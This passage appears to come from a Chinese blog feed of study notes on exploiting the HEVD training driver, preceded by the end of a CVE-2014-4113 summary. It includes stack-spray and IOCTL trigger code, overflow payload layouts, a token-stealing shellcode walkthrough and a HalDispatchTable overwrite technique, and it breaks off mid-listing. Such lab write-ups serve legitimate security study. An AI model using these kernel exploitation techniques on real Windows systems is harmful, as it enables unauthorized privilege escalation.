      &lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;CVE-2014-4113是Win32k下的释放后重引用漏洞(UAF)，该漏洞位于&lt;code&gt;win32k!xxxHandleMenuMessages&lt;/code&gt;中，通过调用&lt;code&gt;win32k!xxxMNFindWindowFromPoint&lt;/code&gt;获取tagWnd指针，在此期间，执行流通过回调机制，返回用户侧，在用户侧释放目标菜单对象，并返回&lt;code&gt;0xFFFFFFFB&lt;/code&gt;。当执行流重新返回内核侧，&lt;br&gt;并没有针对返回值进行校验，直接使用该返回值作为参数传入&lt;code&gt;win32k!xxxSendMessage&lt;/code&gt;发送&lt;code&gt;MN_BUTTONDOWN&lt;/code&gt;消息，由此造成UAF。&lt;/p&gt;
    
    </summary>
    
      <category term="漏洞分析" scheme="https://findream.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
  </entry>
  
  <entry>
    <title>HEVD学习</title>
    <link href="https://findream.github.io/2022/07/05/HEVD%E5%AD%A6%E4%B9%A0/"/>
    <id>https://findream.github.io/2022/07/05/HEVD学习/</id>
    <published>2022-07-05T07:02:11.000Z</published>
    <updated>2022-11-12T07:08:32.818Z</updated>
    
    <content type="html"><![CDATA[<ul><li>HEVD简单学习<a id="more"></a></li></ul><h1 id="0x1-整数溢出"><a href="#0x1-整数溢出" class="headerlink" title="0x1 整数溢出"></a>0x1 整数溢出</h1><h2 id="0x1-1-成因分析"><a href="#0x1-1-成因分析" class="headerlink" title="0x1.1 成因分析"></a>0x1.1 成因分析</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;整数包括无符号整数和有符号整数，但是对于计算机来说，区分无符号整数和有符号整数意义不大，比如”-1”,无符号整数来说，其值为<code>4294967295</code>,也就是<code>0xFFFFFFFF</code>,编译器根据数据类型的不同，生成不同的代码，规定了每个数据变量的长度。在自然语义环境中，如果是4294967295加上4，最终会得到4294967299这个数字，但是，在计算机语义中，这个是在这个数据类型中是最大的，加上4就需要向高位拓展。这样就会丢弃拓展的高位。整数溢出就是这样产生的。例如,<code>0xFFFFFFFF</code>加上<code>4</code>之后，得到的数据就是<code>3</code>。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>整数溢出漏洞的作用是什么，整数溢出主要是为了绕过可能的长度检查。</strong>如下的例子，如果输入任意正整数，都不可能使得b+c 小于 a，但是如果输入的c是0xFFFFFFF0，因为整数溢出，0xFFFFFFFA+0x9 = 0x3.如此就绕过了长度检查。<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">int</span> a = <span class="number">8</span>;</div><div class="line"><span class="keyword">int</span> b = <span class="number">9</span>;</div><div class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;c);</div><div class="line"><span class="keyword">if</span>(b+c &lt; <span class="number">8</span>)</div><div class="line">&#123;</div><div class="line"><span class="built_in">printf</span>(<span class="string">"success"</span>)</div><div class="line">&#125;</div><div class="line"><span class="keyword">else</span></div><div class="line">&#123;</div><div class="line"><span class="built_in">printf</span>(<span class="string">"failed"</span>)</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;HEVD的IntegerOverflow位于TriggerIntegerOverflow函数中，直接通过反汇编看，已知函数栈空间为0x820+0x04=0x824,也就是说要实现栈溢出需要0x824+0x04的大小实现。但是在代码中，对缓冲区长度进行了校验，根据自然语义下理解，缓冲区长度加上4要小于0x800，说明缓冲区不可能超过0x800，这样就不会造成栈溢出。<br>    <img src="http://hacky.wang/blog/20220722/hx8xVjwNx9xf.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;但是由于整数溢出，当我传入的UserBufferLength为0xFFFFFFFF，加个4，得0x3，这样自然就绕过了大小的限制。</p><h2 id="0x1-2-漏洞利用"><a href="#0x1-2-漏洞利用" class="headerlink" title="0x1.2 漏洞利用"></a>0x1.2 漏洞利用</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;根据分析代码，明确使用栈溢出进行利用，使用整数溢出绕过长度检查。查看代码，要使进行缓冲区复制需要两个条件，Buffer内容不为0xBAD0B0B0，长度小于UserBufferLength/4。在使用整数溢出的是和，第二个条件得到满足，但是前面也说了实现栈溢出需要0x824+0x04的大小的缓冲区，所以，构造的payload主要构成是这样的，0x824长度用于填充缓冲，0x04是提权shellcode的地址，最后四个字节内容为0xBAD0B0B0，用于终止缓冲区复制。<br>    <img src="http://hacky.wang/blog/20220722/V9QyljolQXJA.png?imageslim" alt="mark"></p><h1 id="0x2-栈溢出"><a href="#0x2-栈溢出" class="headerlink" title="0x2 栈溢出"></a>0x2 栈溢出</h1><h2 id="0x2-1-环境安装与HEVD说明"><a href="#0x2-1-环境安装与HEVD说明" class="headerlink" title="0x2.1 环境安装与HEVD说明"></a>0x2.1 环境安装与HEVD说明</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;安装完VirtualKd和Windbg Preview之后，配置WindbgPreview，首先在启动虚拟机之前，配置Costumer如下：<code>DbgX.Shell.exe /k com:pipe,resets=0,reconnect,port=$(pipename)</code>。然后启动虚拟机可能也运行不起WindbgPreview，如果出现这种情况，先设置<code>WinDbg.exe</code>的路径，然后运行调试器，等Windbg起来后，在勾选到<code>Costumer</code>。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;HEVD有编译好的SYS文件以及源码，其中编译好的SYS有两个文件夹，<code>secure</code>是已经修复过的SYS，而<code>vulnerable</code>是指存在漏洞的SYS。源码是修复之后的代码。<br>    <img src="http://hacky.wang/blog/20220720/88pOuaHsceok.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;含有漏洞代码主要位于<code>HackSysExtremeVulnerableDriver</code>中的<code>IrpDeviceIoCtlHandler</code>函数中，这个函数包含了HEVD所有的漏洞类型。<br>    <img src="http://hacky.wang/blog/20220720/ABYOW7EY0EiO.png?imageslim" alt="mark"></p><h2 id="0x2-2-成因分析"><a href="#0x2-2-成因分析" class="headerlink" title="0x2.2 成因分析"></a>0x2.2 成因分析</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;栈溢出位于HEVD控制码为0x222003的函数处，也就是<code>sub_44517E</code>,很显然，在<code>sub_44517E</code>函数中，将有R3传入的缓冲区，以及该缓冲区的大小传入函数<code>sub_4451A2</code>,在<code>sub_4451A2</code>函数中，并没有对传入的缓冲区大小进行校验，即判断两个缓冲区大小。导致我们传入大于KernelBuffer的大小的UserBuffer，导致栈溢出。<br>    <img src="http://hacky.wang/blog/20220720/4nSgKhHGpCmm.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20220720/LSCnVV4FxHK7.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;根据IDA的解析结果来看，var_1c占了1C大小的空间，KernelBuffer占据了1C-81C共计800h大小的空间，这样子一共占用了81Ch大小的空间，加上返回地址4h的空间，一共占了820h的空间，所以我们构造栈溢出的话，只需要构造820h+4h的空间即可。<br>    <img src="http://hacky.wang/blog/20220720/LeGxgvP8T0ok.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;从源码来看，存在漏洞的版本，直接按照UserBuffer大小将UserBuffer复制给KernelBuffer，而修复之后的版本，是按照KernelBuffer大小将UserBuffer复制给KernelBuffer，由此修复了漏洞。<br>    <img src="http://hacky.wang/blog/20220720/ABM8Dt0a3dkC.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在<code>HEVD！TriggerBufferOverflowStack</code>处下断，以及在Buffer复制的地方下断，首先断在<code>HEVD！TriggerBufferOverflowStack</code>开头，查看栈顶寄存器为0x98075bd4，当运行到memcpy处，查看目的地址，也就是第一个参数地址为0x980753b4，两者相减，大小为0x00000820。也就是说，只需要构造一个大小为0x820+0x04的缓冲区，其中前0x820用于覆盖KernelBuffer，最后4个字节用于栈溢出，只需要将提取的shellcode地址放到最后四个字节处就可以实现漏洞利用。<br>    <img src="http://hacky.wang/blog/20220720/oFYFtM7SlLfQ.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20220720/3CHfIoNcpwCb.png?imageslim" alt="mark"></p><h2 id="0x2-3-漏洞利用"><a href="#0x2-3-漏洞利用" class="headerlink" title="0x2.3 漏洞利用"></a>0x2.3 漏洞利用</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;首先，需要打开驱动设备，在没有源码的情况下，在<code>DriverEntry</code>函数中，创建了一个名为<code>\\Device\\HackSysExtremeVulnerableDriver</code>的Device，所以在R3也应该创建<code>\\\\.\\HackSysExtremeVulnerableDriver</code>的Device。<br>    <img src="http://hacky.wang/blog/20220720/m7vPrx9mIecR.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;接着，如上所说，应该构造符合条件的Shellcode。具体就是构造一个大小为0x820+0x04的缓冲区，其中前0x820用于覆盖KernelBuffer，最后4个字节用于栈溢出，只需要将提取的shellcode地址放到最后四个字节处就可以实现漏洞利用。<br>    <img src="http://hacky.wang/blog/20220720/OjgBcmXNrzLB.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;最后将payload通过<code>DeviceIoControl</code>传入，Shellcode的原理是通过FS+0x124，获取线程的KTHREAD,然后在通过KTHREAD+0x50获取进程的EPROCESS，然后将当前进程的EPROCESS地址保存在ECX寄存器中。因为EPROCESS是一个链装结构，通过<code>mov eax, [eax + FLINK_OFFSET]</code>这个语句可以定位到下一个EPROCESS链，然后减去0xB8即可定位到EPROCESS结构头。在EPROCESS偏移+0xB4处获取PID，然后和system进程的PID(4)相比，以确定system进程。然后通过0xF8获取system进程token，并将system进程token保存。然后调整栈就可以了。<br>    <img src="http://hacky.wang/blog/20220720/PIoN4NqXKGQ9.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20220720/qjPxVHC365cM.png?imageslim" alt="mark"></p><h2 id="0x2-4-参考"><a href="#0x2-4-参考" class="headerlink" title="0x2.4 参考"></a>0x2.4 参考</h2><ul><li><a href="https://bbs.pediy.com/thread-270172.htm" target="_blank" rel="external">HEVD学习笔记之缓冲区溢出攻击</a></li><li><a href="https://bbs.pediy.com/thread-252484.htm" target="_blank" rel="external">Windows Kernel Exploit 内核漏洞学习(2)-内核栈溢出</a></li></ul><h1 id="0x3-未初始化栈变量"><a href="#0x3-未初始化栈变量" class="headerlink" title="0x3 未初始化栈变量"></a>0x3 未初始化栈变量</h1><h2 id="0x3-1-成因分析"><a href="#0x3-1-成因分析" class="headerlink" title="0x3.1 成因分析"></a>0x3.1 成因分析</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;变量创建之后，如果没有及时进行初始化赋值操作，当再次使用该变量的时候，容易产生出乎意料的运行结果。所以我们在编码过程中，一定不要忘记对变量进行初始化。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;如下代码,函数指针及时进行了初始化赋值<code>pFunc = test;</code>,在后续调用该指针指向的函数时<code>(*pFunc)();</code>，产生了正确的结果<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">test</span><span class="params">()</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"test\n"</span>);</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">    <span class="keyword">void</span> (*pFunc)();</div><div class="line">    pFunc = test;</div><div class="line">    (*pFunc)();</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在例如函数指针没有进行初始化,此时pFunc为随机值，调用他将会产生出乎意料的结果。<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">test</span><span class="params">()</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"test\n"</span>);</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">    <span class="keyword">void</span> (*pFunc)();</div><div class="line">    (*pFunc)();</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;定位到<code>TriggerUninitializedMemoryStack</code>函数，在第五行，声明了函数指针v4，当传入的UserBuffer为特定的0xBAD0B0B0时，为v4赋值。然后对v4判空之后，调用v4，该漏洞存在于，如果传入的并不是0xBAD0B0B0，则不会对v4进行赋值，而v4也没有初始化，则导致程序出现出乎意料的结果，由此未初始化栈变量漏洞产生。<br>    <img src="http://hacky.wang/blog/20220727/QXweqQTxxSgm.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;看一下是如何修复的，初始化UninitializedMemory变量即可。<br>    <img src="http://hacky.wang/blog/20220727/Uu7tqsy4O0e1.png?imageslim" alt="mark"></p><h2 id="0x3-2-漏洞利用"><a href="#0x3-2-漏洞利用" class="headerlink" title="0x3.2 漏洞利用"></a>0x3.2 漏洞利用</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;该漏洞是由于未初始化变量产生的，也就是变量的值是一个随机值，并不是一个默认值(NULL),所以构造零页内存是不可以的。这里用到的漏洞利用技术是栈喷射。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;当传入的Buffer不为0xBAD0B0B0时，不会对v4进行赋值，此时默认的v4的值为NULL。<br><figure class="highlight objectivec"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">BOOL</span> UninitializedMemoryStack()</div><div class="line">&#123;</div><div class="line"><span class="comment">//Step1 打开设备</span></div><div class="line">HANDLE hDevice = <span class="literal">NULL</span>;</div><div class="line">LPCSTR FileName = (LPCSTR)LINK_NAME;</div><div class="line">hDevice = GetDeviceHandle(FileName);</div><div class="line"><span class="keyword">if</span> (INVALID_HANDLE_VALUE == hDevice)</div><div class="line">&#123;</div><div class="line">printf(<span class="string">"[!]  GetDeviceHandle:%d\n"</span>, GetLastError());</div><div class="line"><span class="keyword">return</span> <span class="literal">FALSE</span>;</div><div class="line">&#125;</div><div class="line"><span class="comment">//栈喷射</span></div><div class="line"><span class="comment">//ULONG ShellCodeAddr = (ULONG)ShellCode;</span></div><div class="line"><span class="comment">//if (StackPengShe(ShellCodeAddr) == FALSE)</span></div><div class="line"><span class="comment">//&#123;</span></div><div class="line"><span class="comment">//printf("[!] StackPengShe Error\n");</span></div><div class="line"><span class="comment">//return FALSE;</span></div><div class="line"><span class="comment">//&#125;</span></div><div class="line"><span class="comment">//Step3 触发漏洞</span></div><div class="line">CHAR  UserBuffer[<span class="number">4</span>] = &#123;<span class="number">0</span>&#125;;</div><div class="line">memset(UserBuffer, <span class="string">'A'</span>, <span class="keyword">sizeof</span>(UserBuffer));</div><div class="line">ULONG uReturnlength = <span class="number">0</span>;</div><div class="line"><span class="keyword">if</span> (DeviceIoControl(hDevice,</div><div class="line">HACKSYS_EVD_IOCTL_UNINITIALIZED_STACK_VARIABLE,</div><div class="line">&amp;UserBuffer,</div><div class="line"><span class="keyword">sizeof</span>(UserBuffer),</div><div class="line"><span class="literal">NULL</span>,</div><div class="line"><span class="number">0</span>,</div><div class="line">&amp;uReturnlength,</div><div class="line"><span class="literal">NULL</span>) == <span class="literal">FALSE</span>)</div><div class="line">&#123;</div><div class="line">printf(<span class="string">"[!] DeviceIoControl :%d\n"</span>, GetLastError());</div><div class="line"><span class="keyword">return</span> <span class="literal">FALSE</span>;</div><div class="line">&#125;</div><div class="line"><span class="keyword">return</span> <span class="literal">TRUE</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">kd&gt; <span class="built_in">bp</span> 9951d097</div><div class="line">kd&gt; g</div><div class="line">Break instruction exception - code <span class="number">80000003</span> (first chance)</div><div class="line">HEVD!TriggerUninitializedMemoryStack+<span class="number">0x9d</span>:</div><div class="line">9951d097 85c0            <span class="keyword">test</span>    <span class="built_in">eax</span>,<span class="built_in">eax</span></div><div class="line">kd&gt; r <span class="built_in">eax</span></div><div class="line"><span class="built_in">eax</span>=<span class="number">00000000</span></div></pre></td></tr></table></figure><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在查看一下kernel栈，如下。<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">kd&gt; dps esp</div><div class="line"><span class="number">94237</span>ab4  <span class="number">387</span>f514e</div><div class="line"><span class="number">94237</span>ab8  <span class="number">85</span>f99398</div><div class="line"><span class="number">94237</span>abc  <span class="number">83</span>f0b675 nt!DbgPrintEx</div><div class="line"><span class="number">94237</span>ac0  <span class="number">85</span>f99408</div><div class="line"><span class="number">94237</span>ac4  <span class="number">83</span>eb2361 nt!KeUpdateRunTime+<span class="number">0x164</span></div><div class="line"><span class="number">94237</span>ac8  <span class="number">00000000</span></div><div class="line"><span class="number">94237</span>acc  <span class="number">00000000</span></div><div class="line"><span class="number">94237</span>ad0  <span class="number">00008</span>eb0</div><div class="line"><span class="number">94237</span>ad4  <span class="number">66</span>b499f8</div><div class="line"><span class="number">94237</span>ad8  <span class="number">000067</span>f6</div><div class="line"><span class="number">94237</span>adc  <span class="number">00006700</span></div><div class="line"><span class="number">94237</span>ae0  <span class="number">94237</span>b60</div><div class="line"><span class="number">94237</span>ae4  <span class="number">00000000</span></div><div class="line"><span class="number">94237</span>ae8  <span class="number">8713</span>fc60</div><div class="line"><span class="number">94237</span>aec  <span class="number">87</span>d5e460</div><div class="line"><span class="number">94237</span>af0  <span class="number">83</span>f70c00 nt!KiInitialPCR</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;当启用栈喷射，内核堆栈效果如下。<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">kd&gt; dps esp</div><div class="line"><span class="number">8</span>f3daab4  <span class="number">2361814</span>e</div><div class="line"><span class="number">8</span>f3daab8  <span class="number">881925</span>a8</div><div class="line"><span class="number">8</span>f3daabc  <span class="number">83</span>f0b675 nt!DbgPrintEx</div><div class="line"><span class="number">8</span>f3daac0  <span class="number">88192618</span></div><div class="line"><span class="number">8</span>f3daac4  <span class="number">00941170</span></div><div class="line"><span class="number">8</span>f3daac8  <span class="number">00941170</span></div><div class="line"><span class="number">8</span>f3daacc  <span class="number">00941170</span></div><div class="line"><span class="number">8</span>f3daad0  <span class="number">00941170</span></div><div class="line"><span class="number">8</span>f3daad4  <span class="number">00941170</span></div><div class="line"><span class="number">8</span>f3daad8  <span class="number">00941170</span></div><div class="line"><span class="number">8</span>f3daadc  <span class="number">00941170</span></div><div class="line"><span class="number">8</span>f3daae0  <span class="number">00941170</span></div><div class="line"><span class="number">8</span>f3daae4  <span class="number">00941170</span></div><div class="line"><span class="number">8</span>f3daae8  <span class="number">00941170</span></div><div class="line"><span class="number">8</span>f3daaec  <span class="number">00941170</span></div><div class="line"><span class="number">8</span>f3daaf0  <span class="number">00941170</span></div><div class="line"><span class="number">8</span>f3daaf4  <span class="number">00941170</span></div><div class="line"><span class="number">8</span>f3daaf8  <span class="number">00941170</span></div><div class="line"><span class="number">8</span>f3daafc  <span class="number">00941170</span></div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;栈喷射实现是利用NtMapUserPhysicalPages，设置我们构造好的数据，从而填充内核堆栈。NtMapUserPhysicalPages接收的长度为1024，填充的ShellcodeAddr大小为4，所以需要开辟1024 * 4的空间。这都算是定式，记住即可。<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//栈喷射</span></div><div class="line"><span class="function">BOOL  <span class="title">StackPengShe</span><span class="params">(ULONG ShellcodeAddr)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">NTSTATUS ntStatus = <span class="number">0</span>;</div><div class="line"><span class="comment">//NtMapUserPhysicalPages</span></div><div class="line">pfnNtMapUserPhysicalPages NtMapUserPhysicalPages = (pfnNtMapUserPhysicalPages)GetProcAddress(GetModuleHandleA(<span class="string">"ntdll.dll"</span>),</div><div class="line"><span class="string">"NtMapUserPhysicalPages"</span>);</div><div class="line"><span class="keyword">if</span> (<span class="literal">NULL</span> == NtMapUserPhysicalPages)</div><div class="line">&#123;</div><div class="line"><span class="built_in">printf</span>(<span class="string">"[!] Get Address NtMapUserPhysicalPages Error\n"</span>);</div><div class="line"><span class="keyword">return</span> FALSE;</div><div class="line">&#125;</div><div class="line"><span class="comment">//NtMapUserPhysicalPages 接受的最大长度为1024</span></div><div class="line">PDWORD StackSpray = (PDWORD)<span class="built_in">malloc</span>(<span class="number">1024</span> * <span class="number">4</span>);</div><div class="line"><span class="built_in">memset</span>(StackSpray, <span class="string">'A'</span>, <span class="number">1024</span> * <span class="number">4</span>);</div><div class="line"><span class="comment">//填充ShellcodeAddr</span></div><div class="line"><span class="keyword">for</span> (DWORD i = <span class="number">0</span>; i &lt; <span class="number">1024</span>; i++)</div><div class="line">&#123;</div><div class="line"><span class="comment">//*(PDWORD)((DWORD)StackSpray + i) = (DWORD)&amp;ShellcodeAddr;</span></div><div class="line">StackSpray[i] = ShellcodeAddr;</div><div class="line">&#125;</div><div class="line"><span class="comment">//R3影响R0</span></div><div class="line">ntStatus = NtMapUserPhysicalPages(<span class="literal">NULL</span>, <span class="number">1024</span>, StackSpray);</div><div class="line"><span class="comment">//return ntStatus == 0 ? TRUE : FALSE;</span></div><div class="line"><span class="keyword">return</span> TRUE;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><h1 id="0x4-任意地址覆盖"><a href="#0x4-任意地址覆盖" class="headerlink" title="0x4 任意地址覆盖"></a>0x4 任意地址覆盖</h1><h2 id="0x4-1-成因分析"><a href="#0x4-1-成因分析" class="headerlink" title="0x4.1 成因分析"></a>0x4.1 成因分析</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;任意地址覆盖，指的是代码没有验证地址是否有效直接使用。通过构造payload，将用来提权的Shellcode的地址覆盖到可以导致内核代码执行的区域从而实现提权。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;该漏洞位于HEVD控制码为0x22200B的函数<code>sub_444BCE</code>处,在<code>sub_444BCE</code>函数中，将R3传来的缓冲区传入了<code>sub_444BEE</code>,乍一看，很难发现这段代码有什么问题，就是单纯的将What成员复制给了Where成员，但是在内核中，没有针对地址的有效性进行验证，直接使用的话，这是非常危险的。<br>    <img src="http://hacky.wang/blog/20220720/gglXAaml6Ltv.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;从源码来看，漏洞版本就是没有对地址进行检查，而修复的版本，可以看到对需要读取的地址，使用ProbeForRead和ProbeForWrite进行了检查，ProbeForRead和ProbeForWrite的作用就是检查用户模式缓冲区是否位于用户态，并验证对齐。<br>    <img src="http://hacky.wang/blog/20220720/EmKALOaM0m6g.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在学习这个漏洞的时候，我一直想不明白，就光一个内存写入怎么就触发漏洞了，后来其实才明白原理，其实内存写入这个动作并不会触发漏洞，关键是写入的这个地址(也就是代码里面的What)才是危险的，我们可以这样构造，首先What这个地方存储的是ShellCode的地址，然后在找一个地方，只要可以执行就好了，因为通过这个任意地址覆盖，将Shellcode的地址覆盖到那个可以执行的地址上，那么通过触发，就可以执行Shellcode了。而<code>HalDispatchTable+0x4</code>就是这样一个地址。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;如何定位<code>HalDispatchTable+0x4</code>，首先查看一下<code>nt!NtQueryIntervalProfile</code>这个函数的反汇编，在<code>nt!NtQueryIntervalProfile+0x6B</code>调用了<code>nt!KeQueryIntervalProfile</code>,跟进<code>nt!KeQueryIntervalProfile</code>,显然在在<code>0x8410e8b4</code>调用了<code>nt!HalDispatchTable+0x4</code>这个分发表，<strong>只需要记住，shellcode往这个地方写就是了，貌似高版本的系统这个地方已经被缓解了。</strong><br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div></pre></td><td class="code"><pre><div class="line">kd&gt; u nt!NtQueryIntervalProfile+<span class="number">0x6B</span></div><div class="line">nt!NtQueryIntervalProfile+<span class="number">0x6b</span>:</div><div class="line">8414ffa6 e8e6e8fbff      <span class="keyword">call</span>    nt!KeQueryIntervalProfile (8410e891)</div><div class="line">8414ffab 84<span class="built_in">db</span>            <span class="keyword">test</span>    <span class="built_in">bl</span>,<span class="built_in">bl</span></div><div class="line">8414ffad 741b           